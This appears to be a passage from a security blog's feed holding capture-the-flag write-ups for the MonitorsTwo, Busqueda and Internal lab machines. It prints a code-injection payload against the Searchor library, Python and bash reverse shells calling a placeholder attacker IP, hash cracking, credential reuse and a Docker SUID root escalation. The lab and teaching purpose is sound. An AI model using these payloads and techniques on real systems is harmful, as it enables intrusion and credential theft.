+<pre class="EnlighterJSRAW" data-enlighter-language="mariadb" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ mysql --host=db --user=root --password=root...MySQL [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || cacti              || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.002 sec)</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:enlighter/codeblock {"language":"mariadb"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="mariadb" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">MySQL [(none)]&gt; use cacti;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changed</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:enlighter/codeblock {"language":"mariadb"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="mariadb" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">MySQL [cacti]&gt; show tables;+-------------------------------------+| Tables_in_cacti                     |+-------------------------------------+| aggregate_graph_templates           || aggregate_graph_templates_graph     || aggregate_graph_templates_item      |...| user_auth                           |...+-------------------------------------+111 rows in set (0.001 sec)</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:enlighter/codeblock {"language":"mariadb"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="mariadb" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">MySQL [cacti]&gt; select * from user_auth;+----+----------+--------------------------------------------------------------+...| id | username | password                                                     |...+----+----------+--------------------------------------------------------------+...|  1 | admin    | $2y$10$mYZqbqQQPgQVmtkN5Lrtj.MC40FezJbQlCKem2sj/VnfkEunLTcQW |...|  3 | guest    | 43e9a4ab75570f5b                                             |...|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |...+----+----------+--------------------------------------------------------------+...3 rows in set (0.001 sec)</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>We have obtained a hashed password for the user <code>marcus</code>. Let's store it in a file and attempt to crack it using John The Ripper:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>$ john hash.forjohn --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status&lt;REDACTED&gt;      (?)     1g 0:00:01:09 DONE (2023-05-10 16:18) 0.01444g/s 123.2p/s 123.2c/s 123.2C/s 474747..coucouUse the "--show" option to display all of the cracked passwords reliablySession completed.</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Excellent, the password is present in the rockyou dictionary and, conveniently, it's also reused for SSH authentication. We can proceed to establish an SSH connection to the target machine by utilizing the credentials we've uncovered and get the user flag.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Privilege Escalation and root flag</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>After poking around for some time I realized that the target is running a vulnerable version of Docker:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>marcus@monitorstwo:~$ docker --versionDocker version 20.10.5+dfsg1, build 55c4c88</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>This version is vulnerable to CVE-2021-41091 (more details <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41091" target="_blank" rel="noreferrer noopener">here</a>). Moby (the Docker engine) contains a flaw that permits unprivileged Linux users to access and run programs inside containers, resulting from insufficient permissions in the data directory.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>In simple terms, it is possible to alter the permissions (for instance, setting the SUID bit) of applications executing within the container, and subsequently run them as an unprivileged user outside the container while preserving the assigned permissions to do all kinds of nasty things. In our case this could be abused by setting the SUID bit on the <code>bash</code> binary inside the container, exfiltrating and running it on the host system to gain root access.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>I found a <a href="https://github.com/UncleJ4ck/CVE-2021-41091" target="_blank" rel="noopener" title="">nice exploit on GitHub</a> that we can use to achieve this, but first we need to get root permissions inside the Docker container.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>To achieve this I uploaded a copy of linpeas to the target container. It found an interesting file:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":267,"sizeSlug":"full","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-full"><figure class="wp-image-267"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/monitortwo-capsh.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-capsh-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-capsh-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-capsh-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-capsh-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p><code>/sbin/capsh</code> has a SUID bit set - after looking it up on GTFOBins we find the syntax to abuse it and get a root shell:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>/sbin/capsh --gid=0 --uid=0 --</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Almost there. We can now set the SUID bit on bash with the following command:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>chmod u+s /bin/bash</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Now let's go back to our host machine, upload and run the exploit I mentioned earlier. It will provide step by step instructions to get a root shell:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":268,"sizeSlug":"full","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-full"><figure class="wp-image-268"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/monitortwo-root-shell-on-host.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-root-shell-on-host-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-root-shell-on-host-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-root-shell-on-host-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/16/responsive/monitortwo-root-shell-on-host-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>All that's left to do is grab our root flag!</p>
+<p><!-- /wp:paragraph --></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>HackTheBox: Busqueda write-up</title>
+        <author>
+            <name>andrey</name>
+        </author>
+        <link href="https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-busqueda-write-up/"/>
+        <id>https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-busqueda-write-up/</id>
+        <media:content url="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/Busqueda.png" medium="image" />
+            <category term="hackthebox"/>
+            <category term="ctf"/>
+
+        <updated>2023-04-30T21:52:36+02:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/Busqueda.png" alt="" />
+                    In this article we'll attempt to solve the Busqueda room from HackTheBox. The solution involves exploiting a Flask website to gain initial access, abusing custom&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/Busqueda.png" class="type:primaryImage" alt="" /></p>
+                <p><!-- wp:paragraph --></p>
+<p>In this article we'll attempt to solve the Busqueda room from HackTheBox. The solution involves exploiting a Flask website to gain initial access, abusing custom python scripts and taking advantage of password reuse. This challenge is rated as <code>easy</code>.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Enumeration and initial access</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>An initial scan with <code>rustscan</code> revealed two open ports: 22 and 80. I decided to explore the website first which redirected me to <code>http://searcher.htb/</code>. After mapping the domain name to the IP address of the machine in the /etc/hosts file I was able to visit the website.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>The application allows users to input arbitrary text, which it then uses to construct a search query on the specified search engine. The query is sent to the server with two parameters: <code>query</code> and <code>engine</code>.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Attempting to input the <code>'</code> character in the search field caused the application to break immediately and display an empty page. This behavior suggests that there is no input sanitization whatsoever.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>I also discovered some interesting information located at the bottom of the web page. The website is built with Flask, a Python web framework, and utilizes the Searchor 2.4.0 library to construct its search queries:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":218,"sizeSlug":"full","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-full"><figure class="wp-image-218"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/searcher.htb_.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/searcher.htb_-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/searcher.htb_-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/searcher.htb_-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/searcher.htb_-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>After some research I found out that this version of Searchor has an arbitrary code execution flaw, as detailed on this <a href="https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303" target="_blank" rel="noopener" title="">Snyk page</a>. Taking a look at the GitHub commit related to the vulnerability we can see that the library passes the search query into an <code>eval()</code> statement:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"python"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">...def search(engine, query, open, copy):    try:        url = eval(            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"        )        url = Engine[engine].search(query, copy_url=copy, open_web=open)...</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>Let's test this and see if arbitrary code execution is possible. On my local machine I've setup tcpdump to listen for ICMP traffic with the following command:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"bash"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">tcpdump ip proto \\icmp -i tun0</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>I then crafted the following payload which should send a couple ping requests to my machine. It begins with <code>',</code> to escape the python function call and ends with <code>#</code> to comment the rest of the line:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">', exec("import subprocess;subprocess.run(['ping','-c','2', 'MY_IP']);"))#</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:image {"id":221,"sizeSlug":"large","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-large"><figure class="wp-image-221"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/poc-payload-1024x194.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/poc-payload-1024x194-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/poc-payload-1024x194-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/poc-payload-1024x194-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/poc-payload-1024x194-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>We have code execution! Let's run a netcat listener and adapt a reverse shell from <a href="https://www.revshells.com/" target="_blank" rel="noopener" title="">revshells.com</a> (Python #2 looked like a good candidate to me) and try to access the machine:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"python"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('MY_IP',MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>We get our shell as <code>svc</code> user. We can now proceed and use python to get a more stable shell and get the user flag in /home/svc/user.txt.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Machine enumeration</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>I proceeded with some enumeration of the machine. I found an interesting directory in /opt with some scripts (which we can't read, unfortunately):</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">svc@busqueda:/var/www/app$ ls -alh /opt/scriptstotal 28Kdrwxr-xr-x 3 root root 4.0K Dec 24 18:23 .drwxr-xr-x 4 root root 4.0K Mar  1 10:46 ..-rwx--x--x 1 root root  586 Dec 24 21:23 check-ports.py-rwx--x--x 1 root root  857 Dec 24 21:23 full-checkup.shdrwxr-x--- 8 root root 4.0K Apr  3 15:04 .git-rwx--x--x 1 root root 3.3K Dec 24 21:23 install-flask.sh-rwx--x--x 1 root root 1.9K Dec 24 21:23 system-checkup.py</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>In the web application directory I also found a git configuration file with the some credentials for the user <code>cody</code> and the subdomain <code>gitea.searcher.htb</code>, which I added to my /etc/hosts file:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">svc@busqueda:/var/www/app/.git$ cat config [core]	repositoryformatversion = 0	filemode = true	bare = false	logallrefupdates = true[remote "origin"]	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git	fetch = +refs/heads/*:refs/remotes/origin/*[branch "main"]	remote = origin	merge = refs/heads/main</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>I also found that this password was reused for the <code>svc</code> account. Using this information I was able to access the machine via SSH and obtain a proper shell. Let's see if <code>sudo</code> is available:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">svc@busqueda:~$ sudo -l[sudo] password for svc: Matching Defaults entries for svc on busqueda:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,    use_ptyUser svc may run the following commands on busqueda:    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>Interesting. Let's see what this script does:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py somethingUsage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)     docker-ps     : List running docker containers     docker-inspect : Inpect a certain docker container     full-checkup  : Run a full system checkupsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkupSomething went wrongsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-psCONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS             PORTS                                             NAMES960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up About an hour   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   giteaf84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up About an hour   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_dbsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspectUsage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>After conducting research on the <code>docker inspect</code> command, I found that it is used to extract detailed information about Docker objects, including their configuration details, network settings, metadata, and more. The <code>--format</code> argument can be used to specify the data we want to retrieve, allowing us to extract specific pieces of information. For example, the <code>--format={{.Config}}</code> argument can be used to retrieve the configuration of the object in a Go-style format.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Our custom <code>docker-inspect</code> script is asking for a format and a container name. Let's try to use <code>{{.Config}}</code>:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":228,"sizeSlug":"full","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-full"><figure class="wp-image-228"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/docker-config-dump.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/docker-config-dump-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/docker-config-dump-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/docker-config-dump-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/docker-config-dump-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>We obtained new passwords for the MySQL database and Gitea. I couldn't think of any other way to abuse the scripts so my next step was to explore <code>gitea.searcher.htb</code> which unsurprisingly turned out to be a Gitea instance. Using the credentials we obtained earlier, I logged in as <code>cody</code> but found nothing of particular interest to me except the existence of another user, <code>administrator</code>.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>The Gitea password we dumped earlier turned out to be the password for the 'administrator' user account. With these credentials, we are able to access the administrator's repository, where we finally find the source code for the Python scripts we had discovered earlier in the <code>/opt/scripts</code> directory. This allows us to examine the code and potentially identify any vulnerabilities or weaknesses that could be exploited to gain further access to the system.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":236,"sizeSlug":"full","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-full"><figure class="wp-image-236"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/admin-gitea-scripts.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/admin-gitea-scripts-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/admin-gitea-scripts-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/admin-gitea-scripts-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/admin-gitea-scripts-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>The <code>system-checkup.py</code> script is particularly interesting. Upon inspecting the code, I discovered why it returned the "Something went wrong" message when it was previously ran. More importantly, I also identified a potential vulnerability that could be exploited to gain a root shell on the system. Take a closer look at how <code>arg_list</code> is constructed:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock {"language":"shell"} --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">... elif action == 'full-checkup':        try:            arg_list = ['./full-checkup.sh']            print(run_command(arg_list))            print('[+] Done!')        except:            print('Something went wrong')            exit(1)...</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>The script uses a relative path to <code>full-checkup.sh</code>. This presents an opportunity to exploit the system by creating a custom <code>full-checkup.sh</code> in a directory that we have full access to with the following reverse shell:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#!/bin/bashsh -i 5&lt;&gt; /dev/tcp/[MY_IP]/[MY_PORT] 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>After setting up a netcat listener and executing <code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</code> I was able to obtain a root shell. All that's left to is get the root flag!</p>
+<p><!-- /wp:paragraph --></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>TryHackMe: Internal write-up</title>
+        <author>
+            <name>andrey</name>
+        </author>
+        <link href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-internal-write-up/"/>
+        <id>https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-internal-write-up/</id>
+        <media:content url="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/9/tryhackme-banner.jpg" medium="image" />
+            <category term="tryhackme"/>
+            <category term="ctf"/>
+
+        <updated>2023-04-17T17:52:51+02:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/9/tryhackme-banner.jpg" alt="" />
+                    In this article, we'll delve into the solution to the "Internal" TryHackMe Capture The Flag challenge. Our focus will be on the techniques used to&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/9/tryhackme-banner.jpg" class="type:primaryImage" alt="" /></p>
+                <p><!-- wp:paragraph --></p>
+<p>In this article, we'll delve into the solution to the "Internal" TryHackMe Capture The Flag challenge. Our focus will be on the techniques used to enumerate and exploit both a WordPress blog and a Jenkins installation.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Link: <a href="https://tryhackme.com/room/internal" target="_blank" rel="noopener" title="">https://tryhackme.com/room/internal</a></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Difficulty: <code>Hard</code></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Authors: <code>TheMayor</code></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Firsts steps and enumeration</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>To begin I modified the /etc/hosts file and mapped the machine IP address to "internal.thm". Following that, I executed a customary nmap scan, the results of which are provided below:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># Nmap 7.93 scan initiated Thu Apr 13 20:35:27 2023 as: nmap -sT -sC -v -p- -T5 -oN nmap.log internal.thmWarning: 10.10.55.68 giving up on port because retransmission cap hit (2).Nmap scan report for internal.thm (10.10.55.68)Host is up (0.051s latency).Not shown: 65041 closed tcp ports (conn-refused), 492 filtered tcp ports (no-response)PORT   STATE SERVICE22/tcp open  ssh| ssh-hostkey: |   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)80/tcp open  http|_http-title: Apache2 Ubuntu Default Page: It works| http-methods: |_  Supported Methods: POST OPTIONS HEAD GETRead data files from: /usr/bin/../share/nmap# Nmap done at Thu Apr 13 20:38:14 2023 -- 1 IP address (1 host up) scanned in 166.83 seconds</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>The scan revealed that the target is hosting an SSH server and Apache web server running the default web page. To further investigate, I utilized GoBuster:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://internal.thm/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.5[+] Timeout:                 10s===============================================================2023/04/13 20:41:06 Starting gobuster in directory enumeration mode===============================================================/blog                 (Status: 301) [Size: 311] [--&gt; http://internal.thm/blog/]/wordpress            (Status: 301) [Size: 316] [--&gt; http://internal.thm/wordpress/]/javascript           (Status: 301) [Size: 317] [--&gt; http://internal.thm/javascript/]/phpmyadmin           (Status: 301) [Size: 317] [--&gt; http://internal.thm/phpmyadmin/]/server-status        (Status: 403) [Size: 277]===============================================================2023/04/13 20:59:54 Finished===============================================================</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>It appears that the website is powered by Wordpress, and PHPMyAdmin is also present. My next course of action was to examine the Wordpress site, which features the standard default Wordpress blog template. The site only contains a single published article titled "Hello World!" authored by a user with the username "admin," which seems to be a legitimate username. Since there isn't much else available, I proceeded to access the /wp-admin page.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>To confirm the validity of the "admin" username, I entered various combinations of fake usernames, which resulted in an "unknown username" error. However, when I tried to log in using the username "admin," I received an error message stating that "The password you entered for the username admin is incorrect."</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>To determine whether the password for the "admin" user is easily guessable, I utilized THC Hydra, which found it easily:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
